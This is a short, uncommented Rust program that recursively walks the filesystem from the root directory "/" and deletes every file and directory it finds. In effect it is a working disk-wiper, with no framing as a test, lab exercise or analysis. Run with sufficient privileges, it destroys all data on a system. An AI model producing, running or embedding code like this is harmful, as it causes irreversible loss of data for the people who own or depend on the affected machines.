use std::{fs, io};

use std::fs::DirEntry;
use std::path::Path;

fn visit_dirs(dir: &Path, cb: &dyn Fn(&DirEntry) -> Result<(), io::Error>) -> io::Result<()> {
    if dir.is_dir() {
        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                visit_dirs(&path, cb)?;
            }
            cb(&entry)?;
        }
    }
    Ok(())
}

fn main() -> io::Result<()> {
    let dir = "/";

    visit_dirs(Path::new(&dir), &|entry: &DirEntry| -> io::Result<()> {
        let file_type = entry.file_type()?;
        if file_type.is_dir() {
            fs::remove_dir(entry.path())?;
        } else if file_type.is_file() {
            fs::remove_file(entry.path())?;
        }
        Ok(())
    })?;

    Ok(())
}
